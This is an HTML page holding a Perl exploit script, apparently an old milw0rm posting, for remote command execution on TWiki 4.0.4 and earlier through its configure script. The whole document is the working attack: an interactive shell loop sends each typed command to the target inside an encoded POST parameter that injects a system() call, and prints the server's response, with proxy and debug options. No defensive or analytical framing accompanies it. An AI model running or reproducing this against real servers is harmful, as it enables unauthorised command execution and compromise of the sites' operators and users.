<html><head><title>TWiki <= 4.0.4 (configure) Remote Command Execution Exploit</title></head><pre>#!/usr/bin/perl 
# Tue Aug  1 13:18:12 CEST 2006 jolascoaga@514.es
use strict;
use LWP::UserAgent;
use LWP::Simple;
use HTTP::Request;
use HTTP::Response;
use Getopt::Long;
$| = 1;   # couse 1 is bigger than 0
my ($proxy,$proxy_user,$proxy_pass);
my ($host,$debug,$dir, $command);
my $options = GetOptions (
  'host=s'	      =&gt; \$host, 
  'dir=s'	      =&gt; \$dir,
  'proxy=s'           =&gt; \$proxy,
  'proxy_user=s'      =&gt; \$proxy_user,
  'proxy_pass=s'      =&gt; \$proxy_pass,
  'debug'             =&gt; \$debug);
&amp;help unless ($host); # you dont need root
$dir = &quot;/twiki/bin/configure&quot; unless($dir); # ... we have a template for this
print &quot;$host - $dir\n&quot;;
while () {
		print &quot;tinkiwinki&gt; &quot;; # phf haquerz style
		while(&lt;STDIN&gt;) {
				$command=$_;
				chomp($command);
				last;
		}
		&amp;send($command);
}

sub send {
    my ($cmd) = @_;
    my $ok	=	0;
    my $socket;
    LWP::Debug::level('+') if $debug; # but remember this is crap :D
    my $ua = new LWP::UserAgent();   
    $ua-&gt;agent(&quot;safari/zoo&quot;); 
    if ($host !~ /^http/) {
	$host = sprintf (&quot;http://%s&quot;, $host); # CRAP CRAP CRAP
    }
    my $req = HTTP::Request-&gt;new(POST =&gt; $host.$dir);
    $req-&gt;content('action=update&amp;TYPEOF%3A%29%3Bsystem%28%27'.$cmd.'%27%29%3Bmy+@a%3D%28=anything&amp;submit=Submit');
    $ua-&gt;proxy(['http'] =&gt; $proxy) if $proxy;
    $req-&gt;proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;
    print $req-&gt;as_string() if $debug; 
    my $res = $ua-&gt;request($req);
    my $html = $res-&gt;content(); 
    $html =~ m/&lt;body.*?&gt;(.*?)&lt;div/si; # &lt;pus&gt;
    print $1.&quot;\n&quot;;
    if ($debug) {
		open (DEBG, &quot;&gt;wikidebug&quot;);
		print DEBG $html;
    }
}
sub help {
    print &quot;Syntax: ./$0 --host=url --dir=/horde [options]\n&quot;;
    print &quot;\t--proxy (http), --proxy_user, --proxy_pass\n&quot;;
    print &quot;\t--debug\n&quot;;
    print &quot;the default directory is /twiki/bin/configure\n&quot;;
    print &quot;\nExample\n&quot;;
    print &quot;bash# $0 --host=http(s)://www.server.com/\n&quot;;
    print &quot;\n&quot;;
    exit(1);
}
exit 0;
# &lt;END OF EXPLOIT&gt;

# milw0rm.com [2006-08-07]</pre></html>